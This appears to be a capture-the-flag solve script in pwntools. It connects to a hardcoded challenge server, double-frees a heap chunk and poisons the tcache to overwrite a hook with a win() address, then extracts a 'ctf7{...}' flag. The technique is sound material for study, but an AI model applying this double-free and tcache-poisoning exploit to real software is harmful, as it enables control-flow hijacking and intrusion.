#!/usr/bin/env python3
from pwn import *
import time

io = remote('212.2.250.33', 32384)

banner = io.recvuntil(b'>')
import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

log.success(f"heap: 0x{heap:x}")
log.success(f"win: 0x{win:x}")
log.success(f"hook: 0x{hook:x}")

# Method: Double free + tcache poisoning
# Create chunks
io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', b'A' * 32)
io.recvuntil(b'>')

io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', b'B' * 32)
io.recvuntil(b'>')

io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', b'C' * 32)
io.recvuntil(b'>')

# Free 0
io.sendline(b'3')
io.sendlineafter(b':', b'0')
io.recvuntil(b'>')

# Free 1
io.sendline(b'3')
io.sendlineafter(b':', b'1')
io.recvuntil(b'>')

# Free 0 again (double free) - might work if no checks
io.sendline(b'3')
io.sendlineafter(b':', b'0')
time.sleep(0.5)

# Reallocate and poison
io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', p64(hook))
time.sleep(0.5)

io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', b'D' * 32)
time.sleep(0.5)

io.sendline(b'1')
io.sendlineafter(b':', b'32')
io.sendlineafter(b':', p64(win) * 4)
time.sleep(0.5)

# Trigger all possible ways
io.sendline(b'3')
io.sendlineafter(b':', b'2')
time.sleep(0.5)

io.sendline(b'4')
io.sendlineafter(b':', b'0')
time.sleep(0.5)

io.sendline(b'5')
time.sleep(1)

output = io.recvall(timeout=2)
result = output.decode(errors='ignore')
print("\n" + "="*60)
print(result)
print("="*60)

if 'ctf7{' in result:
    flag = re.search(r'ctf7\{[^}]+\}', result)
    if flag:
        log.success(f"FLAG: {flag.group(0)}")

io.close()
